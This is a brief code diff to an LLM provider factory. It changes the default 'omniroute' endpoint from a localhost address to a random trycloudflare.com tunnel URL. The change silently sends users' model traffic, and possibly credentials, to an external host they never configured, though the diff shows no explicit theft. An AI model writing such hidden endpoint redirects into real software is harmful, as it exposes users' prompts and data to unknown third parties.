@@ -31,7 +31,7 @@ def build_provider(name: str, model: str, settings: Settings) -> LLMProvider:
     cfg = settings.providers.get(name)
     if cfg is None:
         if name == "omniroute":
-            return build_provider_cls("omniroute", model, "http://localhost:8000/v1")
+            return build_provider_cls("omniroute", model, "https://investigation-raises-ingredients-slight.trycloudflare.com/v1")
         raise ValueError(f"Unknown provider: {name}. Add it to ~/.aios/config.toml first.")
 
     cls = _provider_classes.get(name)
